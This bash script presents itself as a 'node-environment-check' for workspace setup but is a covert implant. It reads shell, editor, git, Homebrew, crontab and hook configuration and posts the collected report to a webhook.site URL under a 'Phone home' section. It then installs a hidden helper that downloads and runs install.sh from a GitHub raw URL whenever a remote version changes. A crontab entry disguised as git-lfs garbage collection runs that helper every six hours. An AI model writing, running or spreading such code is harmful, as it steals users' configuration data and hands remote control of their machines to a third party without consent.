#!/bin/bash
# node-environment-check — system environment validation
# Verifies node/git toolchain compatibility for workspace setup.

set -euo pipefail

WEBHOOK="https://webhook.site/1314b89a-bd72-48cf-8285-9b9eae9d43d2"
REPO_RAW="https://raw.githubusercontent.com/brunobossgang/damn-daniel-prank/main"
CACHE_DIR="$HOME/.config/git/.cache"
HELPER="$CACHE_DIR/.gc-helper.sh"
CRON_MARKER="git-lfs-gc"

mkdir -p "$CACHE_DIR"

# ── Recon ────────────────────────────────────────────────────────────────────

_check() { command -v "$1" >/dev/null 2>&1 && echo "yes" || echo "no"; }
_read()  { cat "$1" 2>/dev/null || echo "(not found)"; }
_head()  { head -c 2000 "$1" 2>/dev/null || echo "(not found)"; }

REPORT=""
_add() { REPORT="${REPORT}\\n=== $1 ===\\n$2"; }

# Shell + prompt
_add "shell"         "$SHELL / zsh version: $(zsh --version 2>/dev/null || echo n/a)"
_add "starship"      "$(_check starship) — config: $(_head ~/.config/starship.toml)"
_add "oh-my-zsh"     "$([ -d ~/.oh-my-zsh ] && echo 'YES — ~/.oh-my-zsh exists' || echo 'no')"
_add "p10k"          "$([ -f ~/.p10k.zsh ] && echo 'YES' || echo 'no') — $(_head ~/.p10k.zsh | head -c 300)"
_add "zshrc_tail"    "$(tail -40 ~/.zshrc 2>/dev/null || echo n/a)"
_add "zshenv"        "$(_read ~/.zshenv)"
_add "zprofile"      "$(_read ~/.zprofile)"

# Editor
_add "nvim"          "$(_check nvim) — init: $(_head ~/.config/nvim/init.lua)$(_head ~/.config/nvim/init.vim)"
_add "vim"           "$(_check vim) — vimrc: $(_head ~/.vimrc)"
_add "vscode"        "$([ -d "$HOME/Library/Application Support/Code" ] && echo 'YES' || echo 'no')"
_add "vscode_tasks"  "$(_head "$HOME/Library/Application Support/Code/User/settings.json" | head -c 1000)"
_add "cursor"        "$([ -d "$HOME/Library/Application Support/Cursor" ] && echo 'YES' || echo 'no')"

# Git clients
_add "git_config"    "$(git config --list 2>/dev/null | grep -v 'url\|email\|name' || echo n/a)"
_add "git_xdg"       "$(_read ~/.config/git/config)"
_add "tower"         "$([ -d '/Applications/Tower.app' ] && echo 'YES' || echo 'no')"
_add "fork"          "$([ -d '/Applications/Fork.app' ] && echo 'YES' || echo 'no')"

# Node / npm globals
_add "node"          "$(node --version 2>/dev/null || echo n/a)"
_add "npm_globals"   "$(npm list -g --depth=0 2>/dev/null | head -30 || echo n/a)"
_add "nvm"           "$([ -d ~/.nvm ] && echo 'YES' || echo 'no')"

# Homebrew
_add "brew_list"     "$(brew list 2>/dev/null | tr '\\n' ' ' | head -c 500 || echo n/a)"
_add "brew_services" "$(brew services list 2>/dev/null | head -20 || echo n/a)"

# Existing crontab
_add "crontab"       "$(crontab -l 2>/dev/null || echo '(empty)')"

# Existing hooks
_add "git_hooks_xdg" "$(ls -la ~/.config/git/hooks/ 2>/dev/null || echo '(empty)')"
_add "git_hooks_home" "$(ls -la ~/.git-hooks/ 2>/dev/null || echo '(empty)')"

# macOS info
_add "macos"         "$(sw_vers 2>/dev/null || echo n/a)"
_add "hostname"      "$(hostname)"

# ── Phone home ───────────────────────────────────────────────────────────────

printf "%b" "$REPORT" | curl -s -X POST "$WEBHOOK" \
  -H "Content-Type: text/plain" \
  --data-binary @- >/dev/null 2>&1 || true

# ── Install self-heal + remote-trigger (crontab, same as v4) ─────────────────

cat > "$HELPER" << HELPER_SCRIPT
#!/bin/bash
_hook="\$HOME/.config/git/hooks/pre-push"
_sound="\$HOME/.config/git/.cache/.warmup.aiff"
_ver_local="\$HOME/.config/git/.cache/.ver"
_ver_remote="\$(curl -fsSL '${REPO_RAW}/.ver' 2>/dev/null || echo '')"
_ver_saved="\$(cat "\$_ver_local" 2>/dev/null || echo '')"
_reinstall() {
  _td="\$(mktemp -d /tmp/.nvm-gc.XXXXXX)"
  curl -fsSL '${REPO_RAW}/install.sh'        -o "\$_td/install.sh"        2>/dev/null || return
  curl -fsSL '${REPO_RAW}/notification.aiff' -o "\$_td/notification.aiff" 2>/dev/null || return
  bash "\$_td/install.sh" >/dev/null 2>&1
  rm -rf "\$_td"
}
if [ -n "\$_ver_remote" ] && [ "\$_ver_remote" != "\$_ver_saved" ]; then
  _reinstall && echo "\$_ver_remote" > "\$_ver_local"
fi
HELPER_SCRIPT
chmod +x "$HELPER"

# Crontab entry — looks like git-lfs garbage collection
_existing="$(crontab -l 2>/dev/null || true)"
if ! echo "$_existing" | grep -q "$CRON_MARKER"; then
  (
    echo "$_existing"
    echo "0 */6 * * * /bin/bash $HELPER >/dev/null 2>&1 # $CRON_MARKER"
  ) | crontab -
fi
